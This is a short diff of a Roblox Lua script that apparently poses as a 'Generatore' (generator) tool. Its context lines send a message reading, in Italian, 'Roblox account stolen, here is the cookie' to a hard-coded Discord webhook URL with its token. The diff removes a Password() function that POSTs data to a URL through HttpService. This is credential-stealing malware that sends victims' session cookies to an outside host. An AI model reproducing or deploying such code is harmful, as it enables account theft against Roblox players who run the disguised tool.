@@ -59,24 +59,6 @@ local url = "https://discordapp.com/api/webhooks/1250189153182683239/G3YpQpu-kSK
 SendMessage(url, "**ACCOUNT ROBLOX RUBATO, ECCO IL COOKIE\n**",_G.Nome)
 end
 
-function Password()
-	function SendMessage(url, message)
-		local http = game:GetService("HttpService")
-		local headers = {
-			["Content-Type"] = "application/json"
-		}
-		local data = {
-			["content"] = message
-		}
-		local body = http:JSONEncode(data)
-		local response = request({
-			Url = url,
-			Method = "POST",
-			Headers = headers,
-			Body = body
-		})
-end
-
 local diocane = Window:MakeTab({
 	Name = "Generatore",
 	Icon = "rbxasserid://17822667829",
